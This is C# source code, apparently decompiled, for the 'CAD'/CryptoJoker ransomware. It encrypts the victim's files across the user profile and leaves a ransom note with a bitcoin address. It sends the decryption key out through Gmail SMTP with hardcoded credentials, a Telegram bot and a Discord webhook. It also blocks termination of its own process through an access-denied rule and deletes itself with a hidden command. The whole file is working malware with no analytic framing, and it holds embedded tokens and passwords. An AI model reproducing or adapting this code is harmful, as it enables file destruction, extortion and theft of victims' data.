using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;
using CAD.Properties;

namespace CryptoJoker;

internal class Program
{
	[Flags]
	private enum ProcessAccessRights
	{
		PROCESS_CREATE_PROCESS = 0x80,
		PROCESS_CREATE_THREAD = 2,
		PROCESS_DUP_HANDLE = 0x40,
		PROCESS_QUERY_INFORMATION = 0x400,
		PROCESS_QUERY_LIMITED_INFORMATION = 0x1000,
		PROCESS_SET_INFORMATION = 0x200,
		PROCESS_SET_QUOTA = 0x100,
		PROCESS_SUSPEND_RESUME = 0x800,
		PROCESS_TERMINATE = 1,
		PROCESS_VM_OPERATION = 8,
		PROCESS_VM_READ = 0x10,
		PROCESS_VM_WRITE = 0x20,
		DELETE = 0x10000,
		READ_CONTROL = 0x20000,
		SYNCHRONIZE = 0x100000,
		WRITE_DAC = 0x40000,
		WRITE_OWNER = 0x80000,
		STANDARD_RIGHTS_REQUIRED = 0xF0000,
		PROCESS_ALL_ACCESS = 0x1F0FFF
	}

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr Handle, int securityInformation, [Out] byte[] pSecurityDescriptor, uint nLength, out uint lpnLengthNeeded);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr Handle, int securityInformation, [In] byte[] pSecurityDescriptor);

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetCurrentProcess();

	private static void Main(string[] args)
	{
		if (JokerIsNotRunning())
		{
			SetAclDenyAll();
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "cad.fucked");
			if (!File.Exists(path))
			{
				RunInfector();
			}
		}
	}

	private static void RunInfector()
	{
		try
		{
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "cad.fucked");
			string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
			string path2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "encKey.fucked");
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "CADdecryptor.exe");
			string publicKey = string.Empty;
			string publicAndPrivateKey = string.Empty;
			List<string> files = GetFiles(environmentVariable, "*.*");
			CryptoClass cryptoClass = new CryptoClass();
			foreach (string item in files)
			{
				FileInfo fileInfo = new FileInfo(item);
				if (fileInfo.Extension == ".txt" || fileInfo.Extension == ".md")
				{
					try
					{
						cryptoClass.EncryptFileFully(fileInfo.FullName);
						File.Move(fileInfo.FullName, Path.Combine(fileInfo.DirectoryName, fileInfo.Name + ".fully.fucked"));
					}
					catch (Exception)
					{
					}
				}
				else
				{
					try
					{
						cryptoClass.EncryptFilePartially(fileInfo.FullName);
						File.Move(fileInfo.FullName, Path.Combine(fileInfo.DirectoryName, fileInfo.Name + ".partially.fucked"));
					}
					catch (Exception)
					{
					}
				}
			}
			cryptoClass.GenerateKeys(1024, out publicKey, out publicAndPrivateKey);
			byte[] bytes = GetBytes(cryptoClass.EncryptionKey);
			bytes = cryptoClass.RsaEncryption(bytes, 1024, publicKey);
			File.WriteAllText(path2, Convert.ToBase64String(bytes));
			using (StreamWriter streamWriter = new StreamWriter(path, append: true))
			{
				streamWriter.WriteLine("Do not delete this file, else the decryption process will be broken");
			}
			string cADMessage = Resources.CADMessage;
			cADMessage = cADMessage.Replace("[HWID goes here]", GetHwid());
			cADMessage = cADMessage.Replace("[bitcoin address]", "19iaqy7bkvcTFCoqkUHm7WdYRV4sPNRrqV");
			File.WriteAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "CAD Recovery Information.txt"), cADMessage, Encoding.Unicode);
			SendEmail(publicAndPrivateKey);
			sendtele(publicAndPrivateKey);
			DiscordSend(publicAndPrivateKey);
			if (!File.Exists(text))
			{
				File.WriteAllBytes(text, Resources.CADdecryptor);
			}
			Process.Start(text);
			string location = Assembly.GetEntryAssembly()!.Location;
			ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/C ping 1.1.1.1 -n 3 -w 3000 > Nul & Del \"" + location + "\"");
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			Process.Start(processStartInfo)!.Dispose();
			Environment.Exit(0);
		}
		catch (Exception)
		{
		}
	}

	private static void SendEmail(string publicPrivateKey)
	{
		string body = "The HWID is: " + GetHwid() + " And the decryption key is: " + Convert.ToBase64String(GetBytes(publicPrivateKey));
		MailMessage mailMessage = new MailMessage();
		mailMessage.From = new MailAddress("cadransomware@gmail.com");
		mailMessage.To.Add(new MailAddress("cadransomware@gmail.com"));
		mailMessage.Subject = "New Ransomware Victim!";
		mailMessage.Body = body;
		SmtpClient smtpClient = new SmtpClient();
		smtpClient.Host = "smtp.gmail.com";
		smtpClient.Port = 587;
		smtpClient.EnableSsl = true;
		smtpClient.UseDefaultCredentials = false;
		smtpClient.Credentials = new NetworkCredential("cadransomware@gmail.com", "AAss2288");
		smtpClient.Send(mailMessage);
	}

	public static void sendtele(string publicPrivateKey)
	{
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		WebClient webClient = new WebClient();
		webClient.DownloadString("https://api.telegram.org/bot1248517394:AAFYt6tWtwZ_AeCyStGkVZJb5Z2w20YZyjI/sendMessage?chat_id=-407101281&text=The HWID is: %0A" + GetHwid() + "%0Athe decryption key is: " + Convert.ToBase64String(GetBytes(publicPrivateKey)));
	}

	public static void DiscordSend(string publicPrivateKey)
	{
		try
		{
			WebClient webClient = new WebClient();
			new NameValueCollection();
			string data = string.Concat("{\"content\":\"\",\"embeds\": [{\"title\": \"New ransomware victim\",\"footer\": {\"text\": \"\",\"icon_url\": \"\"},\"thumbnail\": {\"url\": \"\"},\"description\": \"", "", "The HWID is: " + GetHwid() + " And the decryption key is: " + Convert.ToBase64String(GetBytes(publicPrivateKey)), "", "\"}]}");
			webClient.Headers.Add("Content-Type", "application/json");
			webClient.UploadString("https://discord.com/api/webhooks/811786221801832489/zkj8GB8-xKAGxXom9kLccQF44nTPGAXEvU-3IDk3bwAY1M0DcJ9i4pR1PseP0t2yh37u", data);
		}
		catch (Exception)
		{
		}
	}

	private static List<string> GetFiles(string path, string pattern)
	{
		List<string> list = new List<string>();
		try
		{
			list.AddRange(Directory.GetFiles(path, pattern, SearchOption.TopDirectoryOnly));
			string[] directories = Directory.GetDirectories(path);
			foreach (string path2 in directories)
			{
				list.AddRange(GetFiles(path2, pattern));
			}
		}
		catch (Exception)
		{
		}
		return list;
	}

	private static void SetAclDenyAll()
	{
		IntPtr currentProcess = GetCurrentProcess();
		RawSecurityDescriptor processSecurityDescriptor = GetProcessSecurityDescriptor(currentProcess);
		processSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
		SetProcessSecurityDescriptor(currentProcess, processSecurityDescriptor);
	}

	private static RawSecurityDescriptor GetProcessSecurityDescriptor(IntPtr processHandle)
	{
		byte[] pSecurityDescriptor = new byte[0];
		GetKernelObjectSecurity(processHandle, 4, pSecurityDescriptor, 0u, out var lpnLengthNeeded);
		if ((long)lpnLengthNeeded > 32767L)
		{
			throw new Win32Exception();
		}
		if (!GetKernelObjectSecurity(processHandle, 4, pSecurityDescriptor = new byte[lpnLengthNeeded], lpnLengthNeeded, out lpnLengthNeeded))
		{
			throw new Win32Exception();
		}
		return new RawSecurityDescriptor(pSecurityDescriptor, 0);
	}

	private static void SetProcessSecurityDescriptor(IntPtr processHandle, RawSecurityDescriptor dacl)
	{
		byte[] array = new byte[dacl.BinaryLength];
		dacl.GetBinaryForm(array, 0);
		if (!SetKernelObjectSecurity(processHandle, 4, array))
		{
			throw new Win32Exception();
		}
	}

	private static string GetHwid()
	{
		UHWIDEngine uHWIDEngine = new UHWIDEngine();
		return uHWIDEngine.SimpleUID;
	}

	private static bool JokerIsNotRunning()
	{
		bool createdNew;
		Mutex obj = new Mutex(initiallyOwned: true, "CADwalker90912", out createdNew);
		if (!createdNew)
		{
			return false;
		}
		GC.KeepAlive(obj);
		return true;
	}

	private static byte[] GetBytes(string str)
	{
		byte[] array = new byte[str.Length * 2];
		Buffer.BlockCopy(str.ToCharArray(), 0, array, 0, array.Length);
		return array;
	}
}
